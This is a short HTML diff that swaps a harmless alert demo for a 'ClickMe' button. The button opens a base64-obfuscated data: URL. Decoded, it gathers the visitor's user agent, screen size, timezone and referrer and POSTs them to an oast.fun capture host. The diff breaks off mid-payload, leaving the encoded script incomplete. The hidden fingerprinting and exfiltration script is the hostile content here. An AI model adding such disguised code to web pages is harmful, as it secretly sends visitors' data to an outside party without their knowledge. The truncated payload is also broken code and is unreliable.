@@ -1,15 +1,6 @@
-<button onclick="run()">Trigger iframe</button>
+<button onclick="launch()">ClickMe</button>
 
 <script>
-function run() {
-  const html = `<script>alert('Iframe Triggered')<\/script>`;
-  const blob = new Blob([html], { type: 'text/html' });
-  const url = URL.createObjectURL(blob);
-
-  const iframe = document.createElement('iframe');
-  iframe.src = url;
-  iframe.width = "100%";
-  iframe.height = "300px";
-  document.body.appendChild(iframe);
-}
-</script>
+function launch() {
+  window.open("data:text/html;base64,PHNjcmlwdD4KICBjb25zdCBkYXRhID0gewogICAgdWE6IG5hdmlnYXRvci51c2VyQWdlbnQsCiAgICBzY3JlZW46IHNjcmVlbi53aWR0aCArICd4JyArIHNjcmVlbi5oZWlnaHQsCiAgICB0ejogSW50bC5EYXRlVGltZUZvcm1hdCgpLnJlc29sdmVkT3B0aW9ucygpLnRpbWVa
+b25lLAogICAgcmVmOiBkb2N1bWVudC5yZWZlcnJlcgogIH07CgogIGZldGNoKCdodHRwczovL2pxZGZqaXV6bWRoaGtpcHpvYXh4ZjJvY3J3MDdpM2N3Ny5vYXN0LmZ1bi9jYXB0dXJlJywgewogICAgbWV0aG9kOiAnUE9TVCcsCiAgICBoZWFkZXJzOiB7ICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbid9LAogICAgYm9keTo
